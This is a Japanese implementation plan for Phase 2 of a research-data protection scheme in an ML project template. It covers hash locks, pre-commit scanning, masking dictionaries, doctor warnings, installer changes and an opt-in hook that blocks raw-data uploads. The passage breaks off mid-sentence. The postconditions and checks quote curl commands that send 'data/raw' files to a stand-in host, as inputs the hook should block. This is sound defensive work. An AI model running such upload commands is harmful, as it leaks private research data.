# 実装計画: 研究データ保護 Phase 2(機械化: lock・ゲート・検疫・辞書)

参照設計書: `docs/active/20260821-data-protection-phase2.md`(R-001〜R-028)

experiment: false
# 学習・実験を含まない(スクリプト・フック・文書の追加のみ)

```yaml
cost_estimate:
  train_minutes: 0
  epochs: 0
  dataset_gb: 0
  parallel_jobs: 1
```

## 目的

Phase 1 で定めたデータ規律(invariants の三原則・DATA_LOG 台帳)を、人の注意力
ではなくスクリプトとフックで機械的に照合できるようにする。具体的には (a) データの
静かな破損の検知、(b) git への混入防止、(c) 外部送信経路の検疫を実装する。

## 設計判断(リーダー確定・2026-08-21)

設計書に書かれていなかった4点は以下で確定した。本計画はこれを前提にする。

| 項目 | 決定 |
|------|------|
| バックアップ記録 | `data/.backup_stamp`(中身は `YYYY-MM-DD` 1行)。無ければ `[DATA-BACKUP-UNKNOWN]`、30日超で `[DATA-BACKUP-STALE]`。DATA_LOG の7列契約(Phase 1 R-004)は変えない(ADR-0008) |
| 識別子列の解釈 | 両対応。セル値を正規表現として `re.compile` し、無効なら `re.escape` してリテラル語として扱う(ADR-0009) |
| data.lock | `data/data.lock` に配置。`data/exports/` は lock 対象から除外 |
| ハッシュ列規約 | `templates/EXPERIMENT_LOG.md.template` を新設(冒頭に規約 + 空の見出し)。`evaluator.md` の完了時手順に1行追記。`docs/EXPERIMENT_LOG.md` には追記しない |

## 設計判断(premortem HIGH 反映・2026-08-21)

premortem が「scripts/ が downstream に配布されない」ことを検出した。これは設計書に
無かった欠落であり、以下2点の**両方**で対処する(片方だけでは塞がらない)。

| 問題 | 決定 |
|------|------|
| 配布されない scripts/ の実行を、配布される README・cross-review スキルが指示してしまう | claude-init / claude-update の配布対象に scripts/ 配下の**個別ファイル名**を追加する(Step 13)。Phase 1 設計書 48行の「claude-init への追加は Phase 2 で判断」への回答でもある |
| 配布される `_mask.py` が配布されない `scripts/_data_patterns.py` を import すると、downstream で ImportError になり**既存の秘密語マスキング(action_log 経由で毎ツール実行)まで壊れる** | `_mask.py` は `scripts/` を一切 import しない。フック側は `data_patterns.json` の「読み込み + 適用」だけを `.claude/hooks/` 内で自己完結させ、生成とスキャンは scripts 側に置く。共有するのは JSON スキーマのみ(ADR-0007 の整理に沿う) |

役割分担を明文化する(この境界を越える実装をしない):

| 層 | 置き場所 | 責務 | 依存 |
|----|---------|------|------|
| 生成 | `scripts/data_dictionary.py` | DATA_LOG → `data_patterns.json` | `scripts/_data_patterns.py` |
| スキャン | `scripts/_data_patterns.py` + 利用4本 | 読み込み + 行スキャン + ヒット報告 | 標準ライブラリのみ |
| マスク | `.claude/hooks/_mask.py` | 読み込み + 置換のみ | **標準ライブラリのみ。scripts/ を import しない** |

## 現状分析

確認済みの前提(すべてコードを読んで裏取り済み):

- **scripts/ は配布対象外**(premortem HIGH の裏取り): `grep -n "scripts" claude-init.sh` は
  ヒット無し。`claude-init.sh:39` / `claude-update.sh:26` の
  `for item in agents commands hooks skills output-styles rules` と、
  `templates/*.template`(`claude-init.sh:201`)、
  `claude-remote.sh claude-update.sh doctor.sh`(`claude-init.sh:228`)が配布対象のすべて。
  既存の `scripts/env_fingerprint.py` も配布されておらず、README 1230行がその実行を
  案内している。**同じ欠陥が既にある**(本計画で解消する)。
- **配布の前例は「個別ファイル名 + MARKER 保護」**: `claude-init.sh:225-228` /
  `claude-update.sh:154-170` は `MARKER="takayoshitoyoda05/claude-ml-template"` を使い、
  「配布元にマーカーがあり、ローカルの同名ファイルにマーカーが無い」場合は
  ユーザー自身のファイルとみなして上書きしない。
  → `scripts/` をディレクトリごとコピーしてはならない。DATA_LOG 雛形が参照する
  `scripts/preprocess.py` のようなユーザー資産を壊すため、**個別ファイル名の列挙**にする。
- **doctor の差分検査も scripts/ を見ていない**: `doctor.sh:24` の
  `for item in agents commands hooks skills output-styles rules` + agents/shared +
  settings.json のみ。
- **Phase 1 の doctor 節は既存**: `doctor.sh:110-122` / `doctor.ps1:125-141` に
  `=== データ保護(Data Protection)===` 節があり、`[DATA-RAW-WRITABLE]` /
  `[DATA-PROCESSED-READONLY]` / `[DATA-LOG-MISSING]` の3マーカーを出す。
  いずれも `if [ -d "data" ]` / `if (Test-Path "data")` の内側。
- **Phase 1 の parity テストは新マーカー追加で壊れない**(確認済み):
  `tests/test_data_protection_phase1.py:316-326` は
  `sh_markers == ps1_markers` / `len(sh_markers) >= 3` /
  `set(_ALL_MARKERS) <= sh_markers` の3条件。集合の完全一致ではなく
  **下限と部分集合**なので、4マーカーを両側に対称に足せば PASS のまま。
  sh/ps1 の片側だけに足すと第1条件で即 FAIL する(望ましい検知なので維持)。
- **Phase 1 の doctor 実行系テストも壊れない**(確認済み):
  `test_doctor_raw_writable` / `test_doctor_processed_readonly` /
  `test_doctor_datalog_missing`(233-279行)は「Phase 1 の3マーカーのうち
  どれが出るか」しか assert しておらず、他マーカーの混入は検査しない。
  `test_doctor_no_data_dir`(282-291行)は data/ 不在時に `_ALL_MARKERS`
  (Phase 1 の3つ)が出ないことのみを検査する。
  → **新マーカー4種も既存3種と同じ `if [ -d "data" ]` の内側に置けば** Phase 1 の
  テスト更新は一切不要。外側に置くと `test_doctor_no_data_dir` の意図から外れる。
- **DATA_LOG 雛形の注記変更も Phase 1 テストを壊さない**(確認済み):
  `test_datalog_template_required_columns`(159-163行)は 7つの列名文字列が
  `in text` であることだけを見る。変更するのは表の下の HTML コメント注記であり、
  ヘッダ行の `識別子列` という文字列は残すため assert に触れない。
- **Phase 1 は staging の冪等性をテストしていた**: `test_staging_idempotent_apply_twice`
  (`tests/test_data_protection_phase1.py:366-395`)。`--root <dir>` を与えて2回適用し、
  結果が同じであることを検査する。`tests/test_session_monitor.py:442-490` も同型。
  → Phase 2 でも同じ検査が要る(premortem MEDIUM 3。R-027 として追加した)。
- **settings.json の PreToolUse Bash マッチャー**: `Bash|PowerShell` に
  `guard_bash.py` が1本だけ登録済み。data_gate はこの配列の **後ろ** に追加する。
  配列への追加なので、冪等でない staging を書くと2回目で重複登録される。
- **`_mask.py` の構造**: `_common.SECRET_CONTENT_PATTERNS` を土台にした
  `_SIMPLE_PATTERNS`(16行)+ `_PRIVATE_KEY_BLOCK` + `_URL_CREDENTIALS` +
  `_mask_keyvalues`、公開 API は `mask(text) -> str`(176-187行)。
  辞書パターンの適用点は `mask()` 内の `_SIMPLE_PATTERNS` ループ直後。
  import は `import re` と `from _common import SECRET_CONTENT_PATTERNS` の2つのみ
  (10行目)。
- **report_gen は mask 経由**: `report_gen.py:74`(`_copy_masked`)、`:256`
  (test-output.txt)、`:276`(transcript.jsonl)がすべて `mask()` を通る。
  → `mask()` を辞書対応にすれば evidence 出力に自動で効く(R-014 はこれを固定する)。
- **`.claude/checkpoints/` は gitignore 済み**(`.gitignore:1`、`git ls-files` の
  出力が空)。→ `data_patterns.json` は識別子を含みうるが git に載らない。
- **`/_staging_*` も gitignore 済み**(`.gitignore:17`)。過去の staging スクリプトは
  コミットされておらず、`git log --all --diff-filter=A -- '_staging_*'` は空。
- **git hooks は未使用**: `core.hooksPath` 未設定、`.git/hooks` は `.sample` のみ。
- **DATA_LOG 雛形の7列目が「識別子列」**(`templates/DATA_LOG.md.template`)。
  現在の例の値は列名 `subject_id`、表の下に
  `<!-- 識別子列は Phase 2 の辞書半自動生成の入力になる。 -->` の注記がある。
- **DATA_LOG に backup 列は存在しない**(`grep -rn "backup|バックアップ"` を
  雛形・invariants.md・Phase 1 設計書にかけてヒット無し)。→ `data/.backup_stamp` を新設する。
- **cross-review スキルの手順**: 手順2(diff 取得)→ 手順2.5(MCP/exec の選択)→
  手順3(codex 実行)。`2.5.` という小数点付番の前例がある。
- **`templates/` に EXPERIMENT_LOG の雛形は無い**(9種の .template のみ)。
  `evaluator.md:145-146` は「ファイルが無ければ見出し付きで新規作成する」と指示している。
- **CI は pytest を実行しない**(`.github/workflows/*.yml` は verify-hooks.sh と
  verify-installers.sh のみ)。`docs/` は gitignore(**`.gitignore:7`**)。
- **scripts/ の前例**: `scripts/env_fingerprint.py`(shebang + 日本語 docstring +
  型ヒント + 標準ライブラリのみ)。sh/ps1 の対は作っていない。

未実装なのは Phase 2 の成果物すべて(scripts の6本 + 共有エンジン + githooks/pre-commit +
data_gate フック + `_mask.py` 辞書対応 + doctor 4マーカー + 雛形2件 + 配布経路 + 文書整合)。

## 変更対象

| ファイル | 種別 | 変更内容 |
|---------|------|---------|
| `tests/test_data_protection_phase2.py` | 新規 | R-001〜R-025 / R-027 / R-028 の受け入れテスト(R-026 は manual のため対象外) |
| `scripts/_data_patterns.py` | 新規 | 辞書ロード + 行スキャンの共有エンジン(scripts 側の検知ロジックの単一実装) |
| `scripts/data_lock.py` | 新規 | `--update` / `--check`。`data/`(exports/ 除く)の sha256・サイズを `data/data.lock`(JSON)に記録・照合 |
| `scripts/data_dictionary.py` | 新規 | DATA_LOG の識別子列 → `.claude/checkpoints/data_patterns.json` |
| `scripts/export_check.py` | 新規 | `data/exports/` を辞書スキャン。ヒットで該当行報告 + 非0 |
| `scripts/data_scan.py` | 新規 | stdin または引数ファイルを辞書スキャン |
| `scripts/precommit_data_check.py` | 新規 | ステージ差分の辞書ヒット / 大型バイナリ / ipynb outputs 検知 |
| `scripts/githooks/pre-commit` | 新規 | 上記を呼ぶ薄いシェル(オプトイン設置) |
| `scripts/history_scan.py` | 新規 | git 履歴全体を辞書 + サイズ閾値でスキャン(手動実行) |
| `_staging_data_protection_p2.py` | 新規 | data_gate.py 配置 + `_mask.py` 辞書対応 + settings.json 登録(すべて冪等) |
| `templates/DATA_LOG.md.template` | 変更 | 識別子列の注記を「値のパターン(正規表現可)」に更新。**列名・列数(7)は変えない** |
| `templates/EXPERIMENT_LOG.md.template` | 新規 | 冒頭にハッシュ列の記入規約 + 空の見出し |
| `doctor.sh` | 変更 | データ保護節に4マーカー追加 + 差分検査に scripts/ を追加 |
| `doctor.ps1` | 変更 | 同上(sh と1対1) |
| `claude-init.sh` | 変更 | scripts/ 配下の個別ファイルを配布対象に追加(MARKER 保護つき) |
| `claude-init.ps1` | 変更 | 同上(sh と1対1) |
| `claude-update.sh` | 変更 | 同上 |
| `claude-update.ps1` | 変更 | 同上(sh と1対1) |
| `.claude/skills/cross-review/SKILL.md` | 変更 | 手順2の直後に送信前検疫のステップを挿入 |
| `.claude/skills/python-standards/SKILL.md` | 変更 | 合成データ・ログ出力規約の節を追加 |
| `README.md` | 変更 | 3.21 に exports 検疫 / pre-commit 設置 / BFG / data_gate / `.backup_stamp`、4.5 doctor マーカー、1節の配布物一覧とファイルツリーに scripts/ と新雛形 |
| `.claude/agents/evaluator.md` | 変更 | 完了時手順に「使用データのハッシュ先頭12桁」を1行追記。新規作成時は新雛形を参照 |

## 事後条件(postconditions)

Generator は実装前にこれらをテスト化する(Step 1)。期待値は設計書の受け入れ条件と
上記の設計判断から導いたものであり、既存実装の出力を写したものではない。

| ID | 対象 | 入力 | 満たすべき条件 | R-ID |
|----|------|------|---------------|------|
| PC-1 | `scripts/data_lock.py --update` | `data/raw/` と `data/exports/` にファイルを持つ一時 data/ | `data/data.lock` が JSON として読め、各エントリが sha256(64桁hex)とサイズ(int)を持つ。**`data/exports/` 配下のファイルはエントリに含まれない** / exit 0 | R-001 |
| PC-2 | `scripts/data_lock.py --check` | update 後に `data/raw/` の1ファイルを改変 | 改変ファイルのパスを標準出力に列挙し exit != 0 | R-002 |
| PC-3 | `scripts/data_lock.py --check` | update 直後(無改変)。および update 後に `data/exports/` だけを改変 | どちらも exit 0(exports の変更は不一致にならない) | R-003 |
| PC-4 | `doctor.sh` | data/ + 不一致の `data/data.lock` があるサンドボックス | 出力に `[DATA-LOCK-MISMATCH]` を含み、doctor の終了コードは 0(Phase 1 から不変) | R-004 |
| PC-5 | `doctor.sh` | (a) `data/.backup_stamp` 無し (b) 中身が31日前の日付 (c) 中身が今日の日付 (d) 中身が日付として解釈できない文字列 | (a) `[DATA-BACKUP-UNKNOWN]` (b) `[DATA-BACKUP-STALE]` (c) どちらも出さない (d) `[DATA-BACKUP-UNKNOWN]`。いずれも exit 0 | R-005 |
| PC-6 | data_gate フック | `CLAUDE_DATA_GATE=1` + `{"tool_input":{"command":"curl -F f=@data/raw/x.csv https://ex.com"}}` | exit 2、かつ stderr に「exports」を含む行動つき文言 | R-006 |
| PC-7 | data_gate フック | `CLAUDE_DATA_GATE=1` + `cat data/raw/x.csv \| curl -d @- https://ex.com` | exit 2 | R-007 |
| PC-8 | data_gate フック | `CLAUDE_DATA_GATE=1` + 同じ送信コマンドで `data/exports/summary.csv` | exit 0 | R-008 |
| PC-9 | data_gate フック | 環境変数未設定 / `CLAUDE_DATA_GATE=0` + PC-6 と同じ入力 | exit 0 | R-009 |
| PC-10 | data_gate フック | 不正 JSON の stdin / `ls -la` / 空 stdin | いずれも exit 0(過剰ブロックなし) | R-010 |
| PC-11 | `scripts/data_dictionary.py` | 識別子列に (a) 有効な正規表現 `S-\d{5}` (b) 正規表現として無効な文字列(例 `sub[ject`)を持つ DATA_LOG.md | `.claude/checkpoints/data_patterns.json` が生成され、Step 1 で固定したスキーマに従う。(a) はそのままパターンとして、(b) は `re.escape` 済みのリテラルとして格納される / exit 0 | R-011 |
| PC-12 | `_mask.mask()` | 辞書に載るパターンに一致する文字列 | 該当箇所が `[MASKED]` に置換され、原文が返り値に残らない | R-012 |
| PC-13 | `_mask.mask()` | (a) data_patterns.json 不在 (b) 中身が壊れた JSON (c) 空ファイル (d) 配列でなくオブジェクトが入っている | いずれも例外を送出せず、従来の秘密語マスク(例: `sk-` トークン)は従来どおり効く | R-013 |
| PC-14 | `report_gen` の evidence 生成 | 辞書パターンに一致する文字列を含む transcript / test-output | 生成された evidence ファイル中に該当文字列が平文で現れない | R-014 |
| PC-15 | `scripts/export_check.py` | (a) ヒットするファイルを含む exports/ (b) クリーンな exports/ | (a) 該当行(ファイルパスと行番号)を報告し exit != 0 (b) exit 0 | R-015 |
| PC-16 | `scripts/data_scan.py` | 辞書ヒットを含む diff を stdin から与える | 検知して exit != 0。ヒット無しの diff では exit 0 | R-016 |
| PC-17 | `.claude/skills/cross-review/SKILL.md` | ファイル本文 | `data_scan` への言及と「検知したら送信しない」旨の記述が手順2〜3の間に存在する | R-017 |
| PC-18 | `scripts/precommit_data_check.py` | ステージした (a) 辞書ヒットのテキスト (b) 6MB のバイナリ (c) outputs 非空の .ipynb | いずれの単独ケースでも exit != 0 かつ理由が出力に現れる | R-018 |
| PC-19 | `scripts/precommit_data_check.py` | クリーンな小さいテキスト差分をステージ | exit 0 かつ実測経過時間 < 1.0 秒 | R-019 |
| PC-20 | `doctor.sh` | data/ あり・`core.hooksPath` 未設定のサンドボックス | `[DATA-PRECOMMIT-OFF]` を出力。`core.hooksPath` が `scripts/githooks` のとき、および data/ が無いときは出さない | R-020 |
| PC-21 | `doctor.sh` / `doctor.ps1` | 両ファイル本文 | `\[DATA-[A-Z-]+\]` の一意集合が完全一致し、4つの新マーカーをすべて含む(合計7種) | R-021 |
| PC-22 | `scripts/history_scan.py` | 過去コミットに辞書ヒットを埋めた一時 git リポジトリ | 該当コミットを特定して報告し exit != 0 | R-022 |
| PC-23 | `.claude/skills/python-standards/SKILL.md` | ファイル本文 | 「合成データ」「個票を print しない」相当の規約記述が存在する | R-023 |
| PC-24 | `templates/EXPERIMENT_LOG.md.template`, `.claude/agents/evaluator.md`, `README.md` | 各ファイル本文 | 雛形の冒頭にハッシュ先頭12桁の記入規約があり、evaluator.md の完了時手順にも同項目がある。README に exports 検疫手順・BFG/filter-repo 手順・`core.hooksPath` 設置コマンドがある | R-024 |
| PC-25 | `uv run --with pytest python -m pytest tests/ -q` | 既存テスト全件 | 失敗0(Phase 1 の doctor_parity・doctor 実行系・datalog_template を含む) | R-025 |
| PC-26 | `.claude/hooks/_mask.py` と `.claude/hooks/` 配下の全 import 文 | ファイル本文の静的解析 | `scripts` を指す import が1つも無い。さらに同一の `data_patterns.json` を与えたとき、hooks 側ローダと `scripts/_data_patterns.load_patterns` が**同じパターン列**を返す(スキーマ解釈の一致) | R-012, R-013 |
| PC-27 | `_staging_data_protection_p2.py --root <dir>` | 同じサンドボックスに2回適用 | 2回目の適用後の settings.json / `_mask.py` が1回目の適用後と**バイト単位で一致**する(PreToolUse 配列に data_gate が2つ現れない・`_mask.py` に挿入ブロックが2つ現れない)。2回目も exit 0 | R-027 |
| PC-28 | `claude-init.sh` / `.ps1` / `claude-update.sh` / `.ps1` / `doctor.sh` / `.ps1` | 各ファイル本文 | Phase 2 の scripts/ 8ファイルすべてのパスが init・update の sh/ps1 4本すべてに現れる。sh から抽出した配布ファイル名の一意集合と ps1 側の一意集合が完全一致する。doctor sh/ps1 は scripts/ を差分検査の対象に含む | R-028 |

## 実装手順

| # | 内容 | 対象ファイル | 依存 | 並列グループ |
|---|------|-------------|------|-------------|
| 1 | **テストファースト**: PC-1〜PC-28 を受け入れテストとして書き、全件 RED を確認する。`tests/test_data_protection_phase1.py` の様式に倣う(冒頭 docstring で方針明記・`_ROOT` 定数・`subprocess` 起動・`pytest.mark.skipif`・`tmp_path`)。doctor 実行系は同ファイル 15-22 行目に書かれた `verify-installers.sh` の `place_installers` 方式(`TEMPLATE_REPO` を `file://<リポジトリルート>` に sed 差し替え)に倣う。staging 依存のケース(PC-6〜PC-10、PC-12〜PC-14、PC-27)は `_staging_data_protection_p2.py` 未適用時に skip する。**`data_patterns.json` と `data/data.lock` の JSON スキーマをここで確定させる**(Step 2 群と Step 7 が別グループで実装されるため、先に固定しないと両者が食い違う。PC-26 の一致検査がこの契約の番人になる) | `tests/test_data_protection_phase2.py` | なし | A |
| 2 | 辞書ロード + 行スキャンの共有エンジンを実装(`load_patterns(path) -> list[re.Pattern]`、`scan_lines(...) -> list[hit]`)。壊れた JSON・想定外の型は無視して空リストを返す(fail-open)。**scripts 側の検知ロジックはここ1箇所に置き、Step 4・6 は必ずこれを import する**(4本に写すとドリフトする)。標準ライブラリのみに依存し、`scripts/` の他ファイルも import しない | `scripts/_data_patterns.py` | Step 1 | B |
| 3 | data_lock を実装(`--update` / `--check`、出力先は `data/data.lock`、`data/exports/` 配下は走査対象から除外)。sha256 とサイズのみを扱い、辞書には触れないため Step 2 に依存しない。**exports を除外し忘れると `--check` が恒常的に不一致になり警告が無視されるようになる**(PC-1/PC-3 で固定)(R-001〜R-003 対応) | `scripts/data_lock.py` | Step 1 | B |
| 4 | data_dictionary を実装。DATA_LOG の識別子列の各セル値を `re.compile` し、成功すれば正規表現として、`re.error` なら `re.escape` してリテラル語として `data_patterns.json` に格納する。出力先ディレクトリが無ければ作る(R-011 対応) | `scripts/data_dictionary.py` | Step 2 | B |
| 5 | DATA_LOG 雛形の識別子列の注記を「値のパターン(正規表現可。無効な正規表現はリテラル語として扱う)」に更新し、例の値も正規表現の形に合わせる。**ヘッダ行の列名7種は1文字も変えない**(`test_datalog_template_required_columns` が列名の文字列一致を見ているため)(R-011 対応) | `templates/DATA_LOG.md.template` | Step 4 | B |
| 6 | export_check / data_scan / precommit_data_check / githooks/pre-commit / history_scan を実装。いずれも Step 2 のエンジンを import する。precommit は `git diff --cached --name-only` でファイル名を取り、**サイズ閾値超のバイナリは中身を読まずに判定**する(1秒以内の非機能要件。PC-19)(R-015/R-016/R-018/R-019/R-022 対応) | `scripts/export_check.py`, `scripts/data_scan.py`, `scripts/precommit_data_check.py`, `scripts/githooks/pre-commit`, `scripts/history_scan.py` | Step 2 | B |
| 7 | staging スクリプトを1本作る。内容は (a) `data_gate.py` 本体を `.claude/hooks/` に配置 (b) `_mask.py` の `mask()` に辞書適用を追加(`_SIMPLE_PATTERNS` ループ直後・fail-open) (c) settings.json の `Bash\|PowerShell` マッチャーの hooks 配列の**末尾**に data_gate を追加。**(b) の辞書読み込みは `.claude/hooks/` 内で自己完結させ、`scripts/` を絶対に import しない**(downstream に scripts/ が届く保証は Step 13 が作るが、フックが壊れると既存の秘密語マスキングごと死ぬため依存させない。PC-26)。**3つの適用すべてを冪等にする**(適用済みか判定してから書く。settings.json は配列追加、`_mask.py` は行挿入なので、素朴に書くと2回目で重複する。PC-27)。`--root <dir>` を受ける(`tests/test_data_protection_phase1.py:366` の契約)。**data_gate は `CLAUDE_DATA_GATE=1` のときだけ判定に入り、それ以外は最初に exit 0 する**(オプトインを最初の分岐で保証しないと R-009 が壊れる)。判定は guard_bash.py の `_segment_head` / `_segment_mutating_targets`(206-252行)のコマンド分割の考え方に倣う(R-006〜R-010/R-012〜R-014/R-026/R-027 対応) | `_staging_data_protection_p2.py` | Step 1 | C |
| 8 | doctor に (i) データ保護節の4マーカー追加(`[DATA-LOCK-MISMATCH]` / `[DATA-BACKUP-STALE]` / `[DATA-BACKUP-UNKNOWN]` / `[DATA-PRECOMMIT-OFF]`。判定材料は `data/data.lock`・`data/.backup_stamp`・`git config core.hooksPath`)、(ii) 差分検査(`doctor.sh:24` の `for item in ...` 相当)への scripts/ 追加、を行う。**マーカーは既存3種と同じ `if [ -d "data" ]` / `if (Test-Path "data")` の内側**に、同じ `警告: [MARKER] 本文` 書式で置く(外側に置くと Phase 1 の `test_doctor_no_data_dir` の意図から外れる)。**終了コードは変えない**。sh と ps1 を必ず同時に編集する(R-004/R-005/R-020/R-021/R-028 対応) | `doctor.sh`, `doctor.ps1` | Step 1 | D |
| 9 | cross-review スキルの手順2の直後・手順2.5 の前に検疫ステップを挿入。既存の `2.5.` の小数点付番の様式に倣う(R-017 対応) | `.claude/skills/cross-review/SKILL.md` | Step 1 | E |
| 10 | python-standards に合成データ・ログ出力規約の節を追加。既存の `## テスト` / `## docstring` の見出し + 箇条書きの構成に倣う(R-023 対応) | `.claude/skills/python-standards/SKILL.md` | Step 1 | E |
| 11 | README を更新: 3.21 に exports 検疫・pre-commit 設置(`git config core.hooksPath scripts/githooks`)・`data/.backup_stamp` の運用・BFG/filter-repo 手順・data_gate の説明(「静的判定であり補助線」と明記)、4.5 doctor に新マーカー、1節の配布物の説明と 1658行付近のファイルツリーに scripts/ 一式と新雛形を追記。既存 3.21 の表・番号付き手順の書式に倣う(R-024 対応) | `README.md` | Step 1 | E |
| 12 | `templates/EXPERIMENT_LOG.md.template` を新設(冒頭にハッシュ先頭12桁の記入規約 + 空の `# EXPERIMENT_LOG` 見出し)。既存 `templates/DATA_LOG.md.template` の書式(見出し + HTML コメントによる運用注記)に倣う。あわせて evaluator.md の完了時手順(141-160行)に同項目を1行追記し、「ファイルが無ければ新規作成する」の記述を新雛形の参照に更新する(R-024 対応) | `templates/EXPERIMENT_LOG.md.template`, `.claude/agents/evaluator.md` | Step 1 | E |
| 13 | claude-init / claude-update に scripts/ 配下の配布を追加する。**ディレクトリごとコピーしない**(DATA_LOG 雛形が参照する `scripts/preprocess.py` などユーザー資産を壊すため)。`claude-init.sh:225-228` / `claude-update.sh:154-170` の「個別ファイル名 + `MARKER` 保護」の前例に倣い、配布するファイル名を1箇所のリストに列挙する(既存の `scripts/env_fingerprint.py` も同じ欠落があるため、この機会にリストへ含める)。sh/ps1 で列挙内容を1対1にする(R-028 対応) | `claude-init.sh`, `claude-init.ps1`, `claude-update.sh`, `claude-update.ps1` | Step 1 | F |
| 14 | 全テストを実行し RED → GREEN を確認。Phase 1 の doctor_parity・doctor 実行系4件・datalog_template が PASS のままであることと、`./verify-hooks.sh` / `./verify-installers.sh` が通ることを個別に確認する(R-025 対応) | (なし) | Step 2〜13 | A |
| 15 | ユーザーに `! uv run python _staging_data_protection_p2.py` の実行を依頼し、適用後に skip していたケースが PASS することを確認(R-026 対応) | (なし) | Step 14 | A |

並列化判定: **並列化可能(グループ B / C / D / E / F)**。ただし全グループが Step 1(テスト作成)
の完了に依存するため、Step 1 を先に逐次実行してから B〜F を並列展開し、Step 14 で合流する。
B〜F は対象ファイルが完全に分離している(scripts/ と DATA_LOG 雛形 ・ staging 1本 ・
doctor 2本 ・ 文書4本と EXPERIMENT_LOG 雛形 ・ インストーラ4本)。
Step 7(グループ C)が Step 2(グループ B)に依存しないのは**意図的**であり、
フックが `scripts/` を import しない設計判断(PC-26)の帰結である。両者は
`data_patterns.json` のスキーマだけを共有し、その一致は Step 1 のテストが検査する。

## 検証方法

| 検証 | コマンド | PASS 条件 |
|-----|---------|----------|
| Phase 2 受け入れ | `uv run --with pytest python -m pytest tests/test_data_protection_phase2.py -q` | 失敗0(staging 未適用のケースは skip でよい) |
| 既存テスト退行 | `uv run --with pytest python -m pytest tests/ -q` | 失敗0 |
| Phase 1 個別確認 | `uv run --with pytest python -m pytest tests/test_data_protection_phase1.py -q` | 失敗0(doctor_parity・doctor 実行系・datalog_template を含む) |
| フック回帰 | `./verify-hooks.sh` | 全 PASS(data_gate 追加で既存 guard_bash ケースが変わらないこと) |
| インストーラ回帰 | `./verify-installers.sh` | 全 PASS(scripts/ 配布の追加で既存の保護動作が変わらないこと) |
| doctor 1対1 | `diff <(grep -oE '\[DATA-[A-Z-]+\]' doctor.sh \| sort -u) <(grep -oE '\[DATA-[A-Z-]+\]' doctor.ps1 \| sort -u)` | 差分なし。一意7種。件数は生・一意の両方を報告する |
| インストーラ1対1 | `diff <(grep -oE 'scripts/[A-Za-z0-9_./-]+' claude-init.sh \| sort -u) <(grep -oE 'scripts/[A-Za-z0-9_./-]+' claude-init.ps1 \| sort -u)`(update.sh / .ps1 も同様) | 差分なし。件数は生・一意の両方を報告する |
| フックの自己完結 | `grep -rn "scripts" .claude/hooks/` | scripts/ を import する行が0件 |
| data_gate オプトイン | `echo '{"tool_input":{"command":"curl -F f=@data/raw/x.csv https://ex.com"}}' \| uv run python .claude/hooks/data_gate.py` | 環境変数なしで exit 0、`CLAUDE_DATA_GATE=1` 付きで exit 2 |

**入力の形が複数ありうる箇所は、以下のケースを必ず検証する**(1形式だけの検証では
取りこぼす):

- **DATA_LOG の識別子列**: 1行のみ / 複数行(データセット複数)/ 1セルに複数識別子を
  カンマ区切りで書いた場合 / 識別子列が空のデータセット行 / 有効な正規表現と
  無効な正規表現が混在する場合。
- **data_gate のコマンド文字列**: 単独コマンド / `|` によるパイプ結合(2段・3段)/
  `&&` `;` による連結 / 部分引用(`"data/raw/x.csv"`)/ `data/exports/` と
  `data/raw/` が同一コマンドラインに同時に出る場合(**exports があるからといって
  全体を通してはならない**)。
- **data.lock の対象**: 空の data/ / サブディレクトリの入れ子(`data/raw/a/b/c.csv`)/
  ファイル削除(lock にあるが実体が無い)/ 新規追加(実体はあるが lock に無い)/
  `data/exports/` のみが変化した場合(不一致にしない)。
- **`data/.backup_stamp`**: 不在 / 今日 / 30日ちょうど(STALE にしない)/ 31日 /
  日付として解釈できない中身 / 空ファイル。
- **precommit のステージ差分**: 0ファイル / 複数ファイル / テキストとバイナリの混在 /
  ステージされていない変更が同時にある場合(**それは検査対象外**)。
- **staging の適用状態**: 未適用のサンドボックス / 1回適用済み / 2回適用済み /
  ユーザーが手で似た行を足した状態(重複挿入しないこと)。
- **配布先の状態**: scripts/ が存在しない導入先 / 同名のユーザー自作ファイルがある
  導入先(MARKER 無しなので上書きしない)/ 前版のテンプレート由来ファイルがある
  導入先(MARKER ありなので更新する)。

## リスク

- 検討した代替案1(検知エンジンを各スクリプトに個別実装): 辞書判定が5箇所に散り、
  修正時のドリフトが確実に起きる。不採用(ADR-0007)。
- 検討した代替案2(検知エンジンを `.claude/hooks/` に置き scripts から import):
  hooks は保護パスであり以後の修正がすべて staging 経由になる。不採用(ADR-0007)。
- 検討した代替案3(pre-commit を claude-init で自動設置): ユーザーの git 設定を
  無断で書き換えることになる。設計書のユーザー確定(オプトイン)に反するため不採用。
- 検討した代替案4(バックアップ日を DATA_LOG に列追加): 7列契約(Phase 1 R-004)を
  破る。不採用(ADR-0008)。README 3.21 に「バックアップ日は `.backup_stamp` が正」と明記して補う。
- 検討した代替案5(HIGH の解法として `_mask.py` に `sys.path` 操作で scripts/ を
  import させる): 配布さえすれば動くが、フックの起動が導入先の scripts/ の存在に
  依存する形になり、失敗時に**既存の秘密語マスキングごと停止する**(action_log は
  毎ツール実行で走る)。保全系の fail-open 原則にも反するため不採用。
  フック側は自己完結、共有は JSON スキーマのみとした。
- 検討した代替案6(HIGH の解法として scripts/ をディレクトリごと再帰コピー):
  実装は最短だが、DATA_LOG 雛形が参照する `scripts/preprocess.py` などユーザー資産を
  破壊しうる。既存の MARKER 保護の思想にも反するため不採用。個別ファイル名の列挙にした。
- **フック側と scripts 側で `data_patterns.json` の読み込みが2箇所になる**
  (代替案5を不採用にした帰結)。重複するのは「JSON を読んで compile する」数行で
  あって検知ロジックそのものではないが、スキーマ解釈がずれると
  「scripts では検知するのに evidence では伏せられない」という危険な不一致になる。
  PC-26 の一致検査を必ず入れる。
- data_gate は静的なコマンド文字列判定であり、変数展開・シェルスクリプト経由の送信は
  検知できない(guard_bash と同じ既知の限界)。README と遮断文言に「補助線」と明記する。
- 辞書ベース検知は見逃しが原理的にゼロにならない(Phase 3 の読み取り遮断が上位層)。
- 識別子列を正規表現として解釈する決定により、ユーザーの書いたセル値が
  意図せず広く一致しうる(例: `.` や `\d+` 単体)。`_mask` は毎ツール実行で走る
  `action_log` から呼ばれるため、過剰一致はログを読めなくする。
  `_mask.py` は 45-51 行・56-59 行に ReDoS 相当の劣化の実測付き前例を持つ。
  辞書由来のパターンは compile 失敗時に捨て、パターン数に上限を設ける。
- scripts/ を配布対象にすることで、導入先リポジトリに載るテンプレート由来ファイルが
  増える。`CLAUDE_TEMPLATE_GITIGNORE_ALL=1` の `IGNORE_ENTRIES`(`claude-init.sh:103-107`)に
  **配布する個別ファイルのパスを追加する**(リーダー確定 2026-08-21。`scripts/` を
  ディレクトリごと ignore するとユーザー自作の `scripts/preprocess.py` 等まで
